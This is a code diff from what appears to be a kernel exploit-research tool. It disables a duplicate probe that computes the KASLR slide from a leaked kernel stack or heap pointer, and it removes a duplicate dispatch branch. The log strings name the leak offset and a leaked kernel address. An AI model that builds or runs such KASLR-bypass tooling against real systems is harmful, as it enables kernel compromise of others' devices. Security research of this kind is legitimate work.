@@ -14869,8 +14869,9 @@ r355_done:
     #undef IS_KPTR355
 }
 
-/* r355: KASLR slide computation from reliable stack leak at Stack[1]+462672 */
-static void r355_probe(void) {
+/* r355 (fork version): removed — superseded by r355_probe above */
+#if 0
+static void r355_probe_OLD(void) {
     rlog("\n=== r355: KASLR Slide Computation from Stack Kernel Pointer ===\n\n");
     fflush(stdout);
 
@@ -15114,6 +15115,7 @@ r355_done:
     #undef R355_SAMPLES
     (void)0;
 }
+#endif /* end of removed fork r355 */
 
 /* r354: Targeted VM Region Rescan — reproduce r352's changing kernel VA in tag=30 regions */
 static void r354_probe(void) {
@@ -51672,14 +51674,6 @@ new_modes:
             rlog("*** rounds=358: Kernel Heap Leak — Stability + Cross-Launch ***\n");
             rlog("  r354 found: Stack[1]+462672 live kernel heap ptr 0xfffffffefd4f55d6\n");
             rlog("  5-pass stability test + cross-launch correlation + offset calc\n\n");
-            fflush(stdout);
-            r355_probe();
-            goto done;
-        }
-        if (rounds == 358) {
-            rlog("*** rounds=358: KASLR Slide Computation from Stack Leak ***\n");
-            rlog("  r354: 0xFFFFFFFEFD01xxxx at Stack[1]+462672 changed between GPU passes.\n");
-            rlog("  r355: multi-sample capture, slide computation, stability test.\n\n");
             fflush(stdout);
             r355_probe();
             goto done;
